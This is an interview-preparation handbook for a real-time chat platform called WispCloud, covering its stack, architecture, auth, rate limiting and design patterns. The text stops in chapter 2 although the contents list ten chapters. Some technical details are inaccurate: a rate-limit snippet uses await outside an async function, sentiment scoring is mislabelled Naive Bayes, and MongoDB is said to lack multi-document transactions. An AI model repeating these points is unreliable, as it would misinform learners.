# WispCloud Technical Handbook
## Complete Interview Preparation Guide

---

**Project:** WispCloud - Enterprise-Grade Real-Time Messaging Platform
**Author:** Technical Documentation
**Purpose:** Comprehensive interview preparation and technical reference
**Last Updated:** 2025-11-13

---

## Table of Contents

### CHAPTER 1: PROJECT OVERVIEW
- 1.1 Problem Statement & Business Context
- 1.2 Solution Approach & Value Proposition
- 1.3 High-Level Architecture
- 1.4 Complete Tech Stack Breakdown
- 1.5 Key Features & User Workflows

### CHAPTER 2: FOUNDATIONAL CONCEPTS
- 2.1 Domain Knowledge Required
- 2.2 Fundamental Algorithms & Data Structures
- 2.3 Design Patterns Implemented
- 2.4 Architectural Principles Applied

### CHAPTER 3: TECHNOLOGY DEEP-DIVE
- 3.1 Node.js & Express.js
- 3.2 MongoDB & Mongoose
- 3.3 Redis & Caching
- 3.4 Socket.IO & WebSockets
- 3.5 React 19 & Vite
- 3.6 Zustand State Management
- 3.7 JWT Authentication
- 3.8 Docker & Containerization

### CHAPTER 4: SYSTEM ARCHITECTURE
- 4.1 Project Structure & Organization
- 4.2 Component Breakdown
- 4.3 Data Flow & Request Lifecycle
- 4.4 Communication Patterns
- 4.5 Database Architecture

### CHAPTER 5: CRITICAL IMPLEMENTATIONS
- 5.1 Authentication & Authorization
- 5.2 Real-Time Messaging System
- 5.3 Group Chat Implementation
- 5.4 Redis-Backed Presence System
- 5.5 Rate Limiting Strategy

### CHAPTER 6: THIRD-PARTY INTEGRATIONS
- 6.1 Cloudinary (Media Storage)
- 6.2 Google OAuth 2.0
- 6.3 Redis Cloud
- 6.4 MongoDB Atlas

### CHAPTER 7: CONFIGURATION & SETUP
- 7.1 Environment Configuration
- 7.2 Build Process
- 7.3 Docker Compose Setup
- 7.4 Deployment Strategies

### CHAPTER 8: QUALITY & BEST PRACTICES
- 8.1 Error Handling Strategy
- 8.2 Security Measures
- 8.3 Performance Optimizations
- 8.4 Code Quality Practices

### CHAPTER 9: ADVANCED TOPICS
- 9.1 Horizontal Scaling with Redis Adapter
- 9.2 Edge Cases & Solutions
- 9.3 Technical Challenges Faced
- 9.4 Trade-offs & Limitations

### CHAPTER 10: INTERVIEW PREPARATION
- 10.1 Project Walkthrough Script
- 10.2 Technical Questions by Category
- 10.3 Deep Technical Explanations
- 10.4 What I Learned & Would Do Differently

### APPENDIX
- A. Complete API Reference
- B. Database Schema Reference
- C. Environment Variables
- D. Key Functions & Methods
- E. Glossary of Terms

---

# CHAPTER 1: PROJECT OVERVIEW

## 1.1 Problem Statement & Business Context

### The Problem

Modern businesses and communities need reliable, scalable real-time communication platforms. Building such platforms requires solving several complex technical challenges:

1. **Real-time Communication**: Messages must be delivered instantly to connected users
2. **Scalability**: The system must handle thousands of concurrent connections
3. **Reliability**: Messages cannot be lost; the system must be fault-tolerant
4. **Security**: User data and communications must be protected
5. **Performance**: The system must remain responsive under high load
6. **User Experience**: Features like online presence, typing indicators, and group chats

### Business Context

WispCloud addresses these challenges by providing an enterprise-grade messaging platform with:
- Direct messaging (DM) between users
- Group chat functionality with role-based permissions
- Real-time presence tracking (online/offline status)
- Message history and search capabilities
- Secure authentication (email/password + OAuth)
- Scalable architecture supporting horizontal scaling
- Professional deployment options for production use

> **Key Concept:** Enterprise-grade means the system is designed with production requirements in mind: security, scalability, monitoring, error handling, and deployment automation.

---

## 1.2 Solution Approach & Value Proposition

### Solution Architecture

WispCloud uses a **client-server architecture** with:
- **Backend**: Node.js/Express REST API + Socket.IO for real-time
- **Frontend**: React 19 SPA with Zustand state management
- **Database**: MongoDB for persistent storage
- **Cache**: Redis for sessions, presence, and scaling
- **CDN**: Cloudinary for media files

### Why This Matters

This architecture demonstrates understanding of:
1. **Separation of Concerns**: Clear separation between presentation (React), business logic (Express controllers), and data (MongoDB)
2. **Microservices Principles**: Though monolithic, the code is organized to allow future extraction into microservices
3. **Cloud-Native Design**: Containerized, stateless, and horizontally scalable
4. **Production Readiness**: Security, monitoring, error handling, and deployment automation

### Value Proposition

**For Users:**
- Instant messaging with real-time delivery
- Group collaboration with role-based permissions
- Secure authentication with OAuth options
- Media sharing capabilities
- Online presence awareness

**For Developers/Employers:**
- Demonstrates full-stack expertise (backend + frontend)
- Shows understanding of distributed systems (Redis Pub/Sub)
- Exhibits security awareness (RBAC, rate limiting, input validation)
- Proves DevOps knowledge (Docker, multi-stage builds, deployment)
- Displays database optimization skills (compound indexes, text search)

---

## 1.3 High-Level Architecture

### System Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    FRONTEND LAYER                            │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ React 19 Application (SPA)                             │ │
│  │ - 18 Components (Navbar, Sidebar, Chat, Groups)        │ │
│  │ - 8 Pages (Home, Login, Profile, Analytics)            │ │
│  │ - 6 Zustand Stores (Auth, Chat, Groups, Theme)         │ │
│  │ - Socket.IO Client (Real-time subscriptions)           │ │
│  │ - Axios HTTP Client (REST API calls)                   │ │
│  └────────────────────────────────────────────────────────┘ │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ↓ HTTP/REST (Port 5001)
                   ↓ WebSocket (Socket.IO)
                   │
┌──────────────────┴──────────────────────────────────────────┐
│                    BACKEND LAYER                             │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Express.js Application                                 │ │
│  │                                                        │ │
│  │ API Layer:                                             │ │
│  │ ├─ 8 Controllers (Auth, Message, Group, User, etc.)   │ │
│  │ ├─ 7 Route Files (RESTful endpoints)                  │ │
│  │ └─ Request/Response handling                           │ │
│  │                                                        │ │
│  │ Middleware Stack:                                      │ │
│  │ ├─ Helmet.js (Security headers)                        │ │
│  │ ├─ CORS (Cross-origin protection)                      │ │
│  │ ├─ Auth Middleware (JWT verification)                  │ │
│  │ ├─ RBAC Middleware (Permission checks)                 │ │
│  │ ├─ Rate Limiters (6 tiers with Redis)                  │ │
│  │ └─ Validation Middleware (Zod schemas)                 │ │
│  │                                                        │ │
│  │ Real-Time Layer:                                       │ │
│  │ ├─ Socket.IO Server                                    │ │
│  │ ├─ Redis Adapter (Multi-instance support)             │ │
│  │ ├─ Connection Management                               │ │
│  │ └─ Event Broadcasting (newMessage, typing, etc.)      │ │
│  └────────────────────────────────────────────────────────┘ │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ↓ Database Queries
                   │
┌──────────────────┴──────────────────────────────────────────┐
│                    DATA LAYER                                │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ MongoDB (Primary Database)                             │ │
│  │ - 6 Collections (Users, Messages, Groups, etc.)        │ │
│  │ - 15+ Compound Indexes                                 │ │
│  │ - Text Indexes for Search                              │ │
│  │ - TTL Indexes for Auto-deletion                        │ │
│  └────────────────────────────────────────────────────────┘ │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Redis (Cache & Scaling)                                │ │
│  │ - Session Storage                                      │ │
│  │ - Online Presence (Sets)                               │ │
│  │ - Socket Mappings (Hashes)                             │ │
│  │ - Rate Limit Counters                                  │ │
│  │ - User Data Cache (5-min TTL)                          │ │
│  │ - Pub/Sub for Socket.IO scaling                        │ │
│  └────────────────────────────────────────────────────────┘ │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Cloudinary CDN                                         │ │
│  │ - Profile pictures                                     │ │
│  │ - Group images                                         │ │
│  │ - Message attachments                                  │ │
│  └────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### Data Flow Example: Sending a Message

```
1. User types message in React component
   ↓
2. Component calls sendMessage() from useChatStore
   ↓
3. Zustand store makes POST request via Axios
   ↓
4. Backend receives request at /api/messages/send/:userId
   ↓
5. Request passes through middleware:
   - Global rate limiter checks Redis
   - Auth middleware verifies JWT token
   - Message rate limiter checks Redis
   ↓
6. Controller saves message to MongoDB
   ↓
7. Controller emits "newMessage" via Socket.IO
   ↓
8. Redis Pub/Sub broadcasts to all backend instances
   ↓
9. Socket.IO delivers to receiver's socket
   ↓
10. Frontend receives socket event
   ↓
11. Zustand store updates state
   ↓
12. React re-renders with new message
```

> **Interview Tip:** Be able to walk through this data flow step-by-step. Interviewers love seeing that you understand the complete request lifecycle.

---

## 1.4 Complete Tech Stack Breakdown

### Backend Technologies

#### Core Framework
- **Node.js 20+**: JavaScript runtime
  - **Why?** Industry standard, excellent async I/O, huge ecosystem
  - **Alternative considered:** Python (Django/FastAPI), Go (Gin), Java (Spring Boot)
  - **Trade-off:** Single-threaded but perfect for I/O-heavy operations

- **Express.js 4.21**: Web framework
  - **Why?** Lightweight, flexible, well-documented, middleware-based
  - **Alternative considered:** Fastify (faster but less mature), Koa (modern but smaller ecosystem)
  - **Trade-off:** Not as feature-rich as frameworks like NestJS, but simpler

#### Database
- **MongoDB 8.10**: NoSQL database
  - **Why?** Flexible schema, horizontal scaling, excellent for document-based data
  - **Alternative considered:** PostgreSQL (relational), DynamoDB (serverless)
  - **Trade-off:** No ACID transactions across documents (acceptable for chat app)

- **Mongoose 8.10**: MongoDB ODM (Object Data Modeling)
  - **Why?** Schema validation, middleware hooks, query builder
  - **Alternative considered:** Native MongoDB driver, Prisma
  - **Trade-off:** Slight performance overhead, but gains developer productivity

#### Caching & Session
- **Redis 5.8**: In-memory data store
  - **Why?** Blazing fast, Pub/Sub support, data structures (sets, hashes)
  - **Alternative considered:** Memcached (simpler), Amazon ElastiCache
  - **Trade-off:** Must manage persistence, but speed is critical for presence

#### Real-Time Communication
- **Socket.IO 4.8**: WebSocket library
  - **Why?** Automatic fallbacks, room support, Redis adapter for scaling
  - **Alternative considered:** Native WebSockets, ws library, Pusher (SaaS)
  - **Trade-off:** Slightly heavier than native WebSockets, but much easier to use

- **@socket.io/redis-adapter 8.3**: Multi-instance support
  - **Why?** Enables horizontal scaling without sticky sessions
  - **Alternative considered:** socket.io-redis (older), custom Pub/Sub
  - **Trade-off:** Requires Redis, but necessary for production scaling

#### Authentication & Security
- **jsonwebtoken 9.0**: JWT tokens
  - **Why?** Stateless auth, widely supported, compact
  - **Alternative considered:** Session-based auth, OAuth only
  - **Trade-off:** Token revocation is harder, but scalability is better

- **bcryptjs 2.4**: Password hashing
  - **Why?** Industry standard, resistant to rainbow tables
  - **Alternative considered:** bcrypt (native), argon2 (newer)
  - **Trade-off:** Slightly slower than native, but pure JS (better compatibility)

- **passport 0.7 + passport-google-oauth20**: OAuth integration
  - **Why?** Mature library, supports 500+ strategies
  - **Alternative considered:** Custom OAuth implementation, Auth0
  - **Trade-off:** Learning curve, but saves development time

- **Helmet.js 8.1**: Security headers
  - **Why?** Sets HTTP security headers (CSP, HSTS, X-Frame-Options)
  - **Alternative considered:** Manual header setting
  - **Trade-off:** None, it's best practice

#### Rate Limiting
- **express-rate-limit 8.1**: Rate limiting middleware
  - **Why?** Prevents abuse, DoS protection
  - **Alternative considered:** nginx rate limiting, Kong API gateway
  - **Trade-off:** Application-level vs infrastructure-level

- **rate-limit-redis 4.2**: Redis store for rate limits
  - **Why?** Distributed rate limiting across instances
  - **Alternative considered:** Memory store (doesn't work multi-instance)
  - **Trade-off:** Redis dependency

#### Validation
- **Zod 4.1**: Schema validation
  - **Why?** TypeScript-first, excellent error messages, composable
  - **Alternative considered:** Joi, Yup, express-validator
  - **Trade-off:** Newer library, but better DX and type safety

#### File Upload
- **Cloudinary 2.5**: Media hosting
  - **Why?** CDN delivery, image transformations, free tier
  - **Alternative considered:** AWS S3, local storage, Imgur API
  - **Trade-off:** Third-party dependency, but offloads infrastructure

#### NLP & Text Analysis
- **sentiment 5.0**: Sentiment analysis
  - **Why?** Detect message tone (positive/negative/neutral)
  - **Use case:** Analytics, content moderation

- **natural 8.1**: NLP toolkit
  - **Why?** Tokenization, stemming, entity extraction
  - **Use case:** Message search enhancement

- **compromise 14.14**: Grammar processing
  - **Why?** Extract nouns, verbs, entities from text
  - **Use case:** Automatic tagging, smart search

### Frontend Technologies

#### Core Framework
- **React 19.0**: UI library
  - **Why?** Component-based, huge ecosystem, excellent performance
  - **Alternative considered:** Vue 3, Svelte, Angular
  - **Trade-off:** More boilerplate than Vue, but better job market

- **Vite 6.1**: Build tool
  - **Why?** Extremely fast HMR, ESM-native, modern
  - **Alternative considered:** Webpack, Create React App, Parcel
  - **Trade-off:** Newer ecosystem, but speed is worth it

#### Routing
- **React Router DOM 7.2**: Client-side routing
  - **Why?** Industry standard, declarative, data loading support
  - **Alternative considered:** TanStack Router, Wouter
  - **Trade-off:** Slightly heavy, but feature-complete

#### State Management
- **Zustand 5.0**: Lightweight state management
  - **Why?** Minimal boilerplate, hook-based, no Context hell
  - **Alternative considered:** Redux Toolkit, Jotai, Recoil
  - **Trade-off:** Less mature than Redux, but much simpler

> **Key Concept:** Zustand is chosen over Redux because it has 90% less boilerplate for similar functionality. For a medium-sized app like this, Redux would be overkill.

#### HTTP Client
- **Axios 1.7**: HTTP library
  - **Why?** Interceptors, request/response transforms, timeout support
  - **Alternative considered:** Fetch API, TanStack Query + fetch
  - **Trade-off:** Bundle size slightly larger, but DX is superior

#### Real-Time
- **socket.io-client 4.8**: WebSocket client
  - **Why?** Matches backend Socket.IO, automatic reconnection
  - **Alternative considered:** Native WebSocket, ws
  - **Trade-off:** Larger bundle, but reliability is critical

#### Styling
- **TailwindCSS 4.0**: Utility-first CSS
  - **Why?** Fast development, no naming, tree-shakable
  - **Alternative considered:** CSS Modules, Styled Components, SASS
  - **Trade-off:** HTML looks verbose, but CSS is tiny

- **DaisyUI 5.0**: Component library
  - **Why?** Tailwind-based components, themeable
  - **Alternative considered:** Material-UI, Chakra UI, Ant Design
  - **Trade-off:** Less customizable than headless UI, but faster development

#### Icons & Notifications
- **Lucide React 0.475**: Icon set
  - **Why?** Modern, tree-shakable, React-optimized
  - **Alternative considered:** React Icons, Heroicons
  - **Trade-off:** Smaller icon set, but better performance

- **React Hot Toast 2.5**: Toast notifications
  - **Why?** Lightweight, beautiful, customizable
  - **Alternative considered:** react-toastify, Sonner
  - **Trade-off:** None, best balance of features and size

#### Data Visualization
- **react-force-graph 1.48 + d3 7.9**: Graph visualization
  - **Why?** Used for analytics page network graphs
  - **Use case:** Visualizing user connections

### Infrastructure & DevOps

#### Containerization
- **Docker**: Container platform
  - **Why?** Consistent environments, easy deployment
  - **Multi-stage builds:** Separate dev and production images

- **Docker Compose**: Multi-container orchestration
  - **Why?** Local development with MongoDB + Redis + Backend + Frontend
  - **Services:** 5 services with health checks

#### Cloud Platforms (Deployment Options)
- **MongoDB Atlas**: Managed MongoDB (M0 free tier)
- **Redis Cloud**: Managed Redis (30MB free tier)
- **Cloudinary**: Media CDN (free tier)
- **Railway.app**: Container hosting (planned)
- **AWS ECS/Fargate**: Container orchestration (planned)
- **Vercel**: Frontend static hosting (option)

---

## 1.5 Key Features & User Workflows

### Feature 1: User Authentication

**What:**
- Email/password signup with validation
- JWT token-based login
- Google OAuth 2.0 integration
- Session management with HTTP-only cookies

**User Workflow:**
1. User visits signup page
2. Enters email, username, password, full name
3. Backend validates input (Zod schema)
4. Password hashed with bcryptjs (10 salt rounds)
5. User saved to MongoDB
6. JWT generated (7-day expiration)
7. Token sent as HTTP-only cookie
8. User redirected to home page
9. Socket.IO connection established

**Technical Details:**
```javascript
// JWT Payload Structure
{
  userId: "507f1f77bcf86cd799439011",
  iat: 1699999999,  // Issued at
  exp: 1700604799   // Expires (7 days later)
}
```

**Why This Matters:**
- Demonstrates understanding of secure authentication
- Shows knowledge of OAuth 2.0 flow
- Exhibits proper password handling (never stored plain text)
- Uses industry-standard JWT tokens

### Feature 2: Real-Time Direct Messaging (DM)

**What:**
- Send/receive messages instantly
- Message history with pagination
- Read receipts (sent/delivered/read)
- Image attachments
- Typing indicators

**User Workflow:**
1. User selects conversation from sidebar
2. Frontend loads message history (GET /api/messages/:userId)
3. Component subscribes to "newMessage" socket event
4. User types message and clicks send
5. POST request to /api/messages/send/:userId
6. Message saved to MongoDB
7. Socket.IO emits "newMessage" to receiver
8. Receiver's UI updates instantly
9. Sender sees delivery confirmation

**Technical Implementation:**
- **Frontend:** useChatStore (Zustand) + Socket.IO subscriptions
- **Backend:** Message controller + Socket.IO broadcasting
- **Database:** Message model with compound indexes for fast queries

**Data Flow:**
```
[User A Types] → [React Component] → [Zustand Store]
       ↓
[Axios POST] → [Express Route] → [Auth Middleware]
       ↓
[Message Controller] → [MongoDB Save] → [Socket.IO Emit]
       ↓
[Redis Pub/Sub] → [All Backend Instances] → [User B Socket]
       ↓
[Socket Event] → [Zustand State Update] → [React Re-render]
```

### Feature 3: Group Chats

**What:**
- Create groups with name, description, image
- Add/remove members
- Role-based permissions (Owner/Admin/Member)
- Group settings:
  - Who can send messages (all/admins only)
  - Who can add members (all/admins/owner only)
  - Approval required for joining
- Max members limit (default 100, max 1000)

**User Workflow:**
1. User clicks "Create Group"
2. Fills form (name, description, uploads image)
3. Selects initial members from contact list
4. POST /api/groups with validation
5. Group created, creator becomes owner
6. All members join group room via Socket.IO
7. Real-time messages broadcast to room

**Permission System:**
```javascript
Role: Owner
  - canSendMessages: true
  - canAddMembers: true
  - canRemoveMembers: true
  - canEditGroup: true

Role: Admin
  - canSendMessages: true
  - canAddMembers: true
  - canRemoveMembers: true
  - canEditGroup: true

Role: Member
  - canSendMessages: true (unless group settings restrict)
  - canAddMembers: false
  - canRemoveMembers: false
  - canEditGroup: false
```

**Why This Matters:**
- Shows understanding of RBAC (Role-Based Access Control)
- Demonstrates complex permission logic
- Exhibits Socket.IO rooms pattern
- Proves ability to handle many-to-many relationships

### Feature 4: Online Presence Tracking

**What:**
- Real-time online/offline status
- Last seen timestamps
- Presence updates broadcast to all users

**Technical Implementation:**

**Redis Data Structures:**
```
online_users (Set):
  - "user123"
  - "user456"
  - "user789"

user:user123:socketId (String): "socket_abc123"
user:user123:lastSeen (String): "1699999999999"

socket_user_map (Hash):
  - "socket_abc123": "user123"
  - "socket_def456": "user456"
```

**Connection Flow:**
1. User logs in → Frontend establishes Socket.IO connection
2. Backend receives connection with userId in query
3. Redis: Add userId to "online_users" set
4. Redis: Map socket.id ↔ userId (bidirectional)
5. Broadcast updated online users list to all clients
6. Frontend updates UI to show green dot

**Disconnection Flow:**
1. User closes browser/loses connection
2. Socket.IO "disconnect" event fires
3. Redis: Remove userId from "online_users" set
4. Redis: Delete socket mappings
5. Redis: Update lastSeen timestamp
6. Broadcast updated list to remaining users

**Why This Matters:**
- Shows Redis data structure expertise
- Demonstrates real-time system design
- Exhibits proper cleanup (no memory leaks)

### Feature 5: Multi-Tier Rate Limiting

**What:**
- 6 different rate limiters for different endpoints
- Redis-backed for distributed rate limiting
- Graceful fallback to memory if Redis unavailable

**Tiers:**
1. **Global Limiter:** 500-1000 req/15min (prod/dev)
2. **Auth Limiter:** 20 attempts/15min (login/signup)
3. **Message Limiter:** 50 messages/minute
4. **Upload Limiter:** 10 uploads/hour
5. **API Limiter:** 200 requests/minute
6. **User Data Limiter:** 100 requests/minute

**Why Multiple Tiers?**
- Prevents different types of abuse
- Protects expensive operations (uploads, auth)
- Balances security and user experience

**Technical Details:**
```javascript
// Rate limit key generation
Key: "rl:<ip>-<userId>:<endpoint>"
Value: Request count
TTL: Window duration (e.g., 15 minutes)

Example: "rl:192.168.1.1-user123:auth" = 5
```

**Why This Matters:**
- Demonstrates security awareness
- Shows understanding of DoS prevention
- Exhibits distributed systems knowledge (Redis for shared state)

### Feature 6: Message Search & NLP Features

**What:**
- Full-text search on messages
- Sentiment analysis (positive/negative/neutral)
- Entity extraction (people, places, organizations)
- Concept extraction
- Keyword generation
- Importance scoring

**Technical Implementation:**

**MongoDB Text Index:**
```javascript
// Enables full-text search
messageSchema.index({ text: 'text' });

// Search query
Message.find({
  $text: { $search: "project deadline" }
})
```

**NLP Processing Pipeline:**
1. User sends message "Meeting tomorrow at Starbucks"
2. Message saved to MongoDB
3. NLP analysis runs:
   - **Sentiment:** neutral
   - **Entities:**
     - { type: 'temporal', value: 'tomorrow' }
     - { type: 'place', value: 'Starbucks' }
   - **Keywords:** ['meeting', 'tomorrow', 'starbucks']
4. Analyzed data saved in message document

**Why This Matters:**
- Shows awareness of advanced features
- Demonstrates text processing skills
- Exhibits potential for AI/ML integration

### Feature 7: Secure File Upload

**What:**
- Profile pictures
- Group images
- Message attachments
- Image optimization and CDN delivery

**Technical Flow:**
1. User selects image file
2. Frontend converts to Base64
3. POST request with Base64 data
4. Backend validates file type and size
5. Upload to Cloudinary API
6. Receive public URL
7. Save URL to MongoDB
8. Return URL to frontend
9. Frontend displays image from CDN

**Security Measures:**
- File type validation (images only)
- Size limits (enforced)
- Rate limiting on uploads
- Cloudinary's automatic security scanning

**Why This Matters:**
- Shows file handling expertise
- Demonstrates CDN integration
- Exhibits security awareness (validation)

---

# CHAPTER 2: FOUNDATIONAL CONCEPTS

## 2.1 Domain Knowledge Required

### What is a Messaging Platform?

A messaging platform is an application that enables real-time text communication between users. It consists of:

1. **Messages**: Text, images, or files sent between users
2. **Conversations**: Series of messages between participants
3. **Presence**: Online/offline status of users
4. **Notifications**: Alerts for new messages or events
5. **Groups**: Multi-user conversations

### Key Concepts

#### Synchronous vs Asynchronous Communication

**Synchronous (WispCloud uses this):**
- Real-time delivery via WebSockets
- Both parties can be online simultaneously
- Instant feedback (typing indicators, delivery status)
- Examples: Slack, Discord, WhatsApp

**Asynchronous:**
- Email-style delayed delivery
- No real-time requirements
- Store-and-forward pattern
- Examples: Email, forums

> **Interview Tip:** WispCloud uses synchronous communication for instant messaging but stores messages asynchronously in MongoDB for persistence.

#### Stateful vs Stateless

**Stateless (REST API):**
- Each request contains all needed information
- Server doesn't remember previous requests
- Scales horizontally easily
- WispCloud's REST API is stateless (JWT in each request)

**Stateful (WebSocket):**
- Server maintains connection state
- Persistent connection between client and server
- WispCloud's Socket.IO connections are stateful
- Requires session affinity or Redis Adapter for scaling

#### Pub/Sub Pattern (Publish-Subscribe)

**What:** Publishers send messages to channels; subscribers receive them

**WispCloud Usage:**
- Socket.IO uses Redis Pub/Sub for multi-instance communication
- When Backend Instance 1 receives a message, it publishes to Redis
- All backend instances (1, 2, 3...) subscribe and receive the event
- Each instance broadcasts to its connected sockets

**Why:** Enables horizontal scaling without sticky sessions

```
Message sent to Backend 1
       ↓
Backend 1 publishes to Redis channel "socket.io"
       ↓
Redis broadcasts to all subscribers (Backends 1, 2, 3)
       ↓
Each backend emits to its connected sockets
```

#### WebSocket Protocol

**What:** Full-duplex communication protocol over TCP

**HTTP vs WebSocket:**
```
HTTP Request/Response:
Client → [Request] → Server
Client ← [Response] ← Server
(Connection closes)

WebSocket:
Client ↔ [Persistent Connection] ↔ Server
(Stays open, bidirectional messages)
```

**Why WebSocket:**
- Low latency (no HTTP overhead)
- Bidirectional (server can push messages)
- Efficient (no repeated handshakes)

**Socket.IO Enhancement:**
- Automatic reconnection
- Fallback to polling if WebSocket unavailable
- Room support for group messaging
- Event-based communication

#### CAP Theorem

**What:** In distributed systems, you can have only 2 of 3:
- **Consistency:** All nodes see same data
- **Availability:** System always responds
- **Partition Tolerance:** Works despite network issues

**WispCloud Choice:** AP (Availability + Partition Tolerance)
- Redis may have slight delays in replication
- MongoDB eventual consistency for some operations
- Trade-off: Prioritize uptime over perfect consistency

> **Key Concept:** For a chat app, availability is more important than perfect consistency. A user would rather see their message delivered (even if it takes 100ms to replicate) than have the system be down.

#### ACID vs BASE

**ACID (Traditional databases):**
- **Atomicity:** All or nothing
- **Consistency:** Valid state
- **Isolation:** Concurrent transactions don't interfere
- **Durability:** Committed data persists

**BASE (NoSQL databases):**
- **Basically Available:** System works most of the time
- **Soft state:** State may change without input
- **Eventual consistency:** Data will be consistent eventually

**WispCloud:** Uses BASE with MongoDB
- Messages are immediately available
- Indexes update asynchronously
- Replication may lag slightly

---

## 2.2 Fundamental Algorithms & Data Structures

### Data Structures Used

#### 1. Hash Maps (Objects/Maps)
**Where:** Redis socket mappings, user caching, everywhere
**Why:** O(1) lookup time
```javascript
// Redis hash map for socket-to-user mapping
socket_user_map: {
  "socket_abc123": "user123",
  "socket_def456": "user456"
}
```

#### 2. Sets
**Where:** Redis online users
**Why:** O(1) add/remove/check, no duplicates
```javascript
// Redis set for online users
online_users: ["user123", "user456", "user789"]
```

#### 3. Arrays (Lists)
**Where:** Message history, user lists, group members
**Why:** Ordered, iterable
```javascript
// Message array in Zustand store
messages: [
  { id: 1, text: "Hello", senderId: "user123" },
  { id: 2, text: "Hi!", senderId: "user456" }
]
```

#### 4. Trees (MongoDB B-Trees)
**Where:** Database indexes
**Why:** O(log n) search in sorted data
**Example:** Compound index on (senderId, receiverId, createdAt)

#### 5. Linked Lists (Conceptual)
**Where:** Pagination cursors
**Why:** Efficient traversal for sequential data

### Algorithms Implemented

#### 1. Cursor-Based Pagination
**Problem:** Loading millions of messages is slow
**Solution:** Cursor-based pagination

**How it works:**
```javascript
// Load first 50 messages
GET /messages/:userId?limit=50

// Load next 50 (using cursor from last message)
GET /messages/:userId?limit=50&cursor=507f191e810c19729de860ea

// Implementation
const messages = await Message.find({
  senderId: userId,
  receiverId: currentUserId,
  _id: { $lt: cursor }  // Messages before cursor
})
.sort({ createdAt: -1 })
.limit(50);
```

**Why not offset pagination?**
- Offset pagination (`skip(100)`) gets slower as offset increases
- Cursor pagination is O(log n) regardless of position

> **Interview Tip:** If asked about pagination, explain why cursor-based is superior for large datasets.

#### 2. Rate Limiting (Sliding Window)
**Problem:** Prevent abuse without blocking legitimate users
**Solution:** Sliding window rate limit

**Algorithm:**
```javascript
function checkRateLimit(userId, limit, windowMs) {
  const key = `rl:${userId}`;
  const now = Date.now();
  const windowStart = now - windowMs;

  // Remove old requests outside window
  await redis.zremrangebyscore(key, 0, windowStart);

  // Count requests in window
  const count = await redis.zcard(key);

  if (count >= limit) {
    return false; // Rate limited
  }

  // Add current request
  await redis.zadd(key, now, `${now}-${Math.random()}`);
  await redis.expire(key, windowMs / 1000);

  return true; // Allowed
}
```

**Why sliding window?**
- More accurate than fixed window
- No reset spike (requests spread across time)

#### 3. Text Search (TF-IDF in MongoDB)
**Problem:** Find relevant messages in millions
**Solution:** MongoDB text index with scoring

**How it works:**
1. Text index analyzes words in messages
2. Removes stop words ("the", "a", "is")
3. Stems words ("running" → "run")
4. Calculates relevance score (TF-IDF)
5. Returns ranked results

```javascript
// Search implementation
const results = await Message.find({
  $text: { $search: "project deadline" }
}, {
  score: { $meta: "textScore" }
})
.sort({ score: { $meta: "textScore" } })
.limit(20);
```

#### 4. Sentiment Analysis (Naive Bayes)
**Problem:** Detect message tone
**Solution:** Pre-trained sentiment classifier

**How it works:**
1. Tokenize message into words
2. Look up sentiment score for each word
3. Calculate aggregate score
4. Classify as positive/negative/neutral

```javascript
import Sentiment from 'sentiment';
const sentiment = new Sentiment();

const result = sentiment.analyze('I love this project!');
// result: { score: 3, comparative: 0.75, positive: ['love'] }
```

#### 5. Connection Pooling
**Problem:** Creating new database connections is expensive
**Solution:** Reuse connections from a pool

**Mongoose Implementation:**
```javascript
mongoose.connect(MONGODB_URI, {
  maxPoolSize: 10,  // Max 10 connections
  minPoolSize: 5,   // Keep 5 alive
  socketTimeoutMS: 45000
});
```

**Why:** Reduces connection overhead from seconds to milliseconds

---

## 2.3 Design Patterns Implemented

### 1. MVC (Model-View-Controller)

**What:** Separation of data, UI, and business logic

**WispCloud Implementation:**
- **Model:** Mongoose schemas (User, Message, Group)
- **View:** React components
- **Controller:** Express route handlers

**Example:**
```
User clicks "Send Message"
       ↓
[View: MessageInput.jsx] → User interaction
       ↓
[Controller: message.controllers.js] → Business logic
       ↓
[Model: message.model.js] → Data persistence
```

**Why:** Separates concerns, testable, maintainable

### 2. Middleware Pattern

**What:** Chain of functions that process requests

**WispCloud Middleware Stack:**
```javascript
Request → Helmet → CORS → Body Parser → Cookie Parser
    → Session → Passport → Rate Limiter → Auth Check
    → Validation → Controller → Response
```

**Example Implementation:**
```javascript
router.post('/messages/send/:userId',
  protectRoute,        // Auth middleware
  messageLimiter,      // Rate limit middleware
  validate(messageSchema), // Validation middleware
  sendMessage          // Controller
);
```

**Why:** Reusable, composable, testable

### 3. Repository Pattern (Implicit)

**What:** Abstraction layer over data access

**WispCloud Usage:**
- Mongoose models act as repositories
- Controllers call model methods, not direct MongoDB queries

**Example:**
```javascript
// Controller doesn't write MongoDB queries
const user = await User.findById(userId);

// Model encapsulates data access
class User extends mongoose.Model {
  static async findByEmail(email) {
    return this.findOne({ email });
  }
}
```

**Why:** Decouples business logic from database

### 4. Observer Pattern (Pub/Sub)

**What:** Objects subscribe to events and get notified

**WispCloud Usage:**
- Socket.IO events
- Frontend subscribes to "newMessage" events
- Backend publishes events when messages are sent

**Example:**
```javascript
// Frontend subscribes (Observer)
socket.on('newMessage', (message) => {
  addMessageToUI(message);
});

// Backend publishes (Subject)
io.to(receiverSocketId).emit('newMessage', message);
```

**Why:** Loose coupling, real-time updates

### 5. Singleton Pattern

**What:** Only one instance of a class exists

**WispCloud Usage:**
- Redis client
- MongoDB connection
- Socket.IO server

**Example:**
```javascript
let redisClient = null;

export const connectRedis = async () => {
  if (redisClient) return redisClient; // Return existing

  redisClient = createClient({ url: REDIS_URL });
  await redisClient.connect();
  return redisClient;
};

export const getRedisClient = () => {
  if (!redisClient) throw new Error('Not connected');
  return redisClient;
};
```

**Why:** Prevents multiple connections, resource management

### 6. Factory Pattern

**What:** Create objects without specifying exact class

**WispCloud Usage:**
- Rate limiter factory
- Creates different rate limiters with different configs

**Example:**
```javascript
const createRateLimiter = (options) => {
  const { windowMs, max, message } = options;

  return rateLimit({
    windowMs,
    max,
    message: { error: message },
    store: new RedisStore({ client: getRedisClient() })
  });
};

export const authLimiter = createRateLimiter({
  windowMs: 15 * 60 * 1000,
  max: 20,
  message: 'Too many authentication attempts'
});

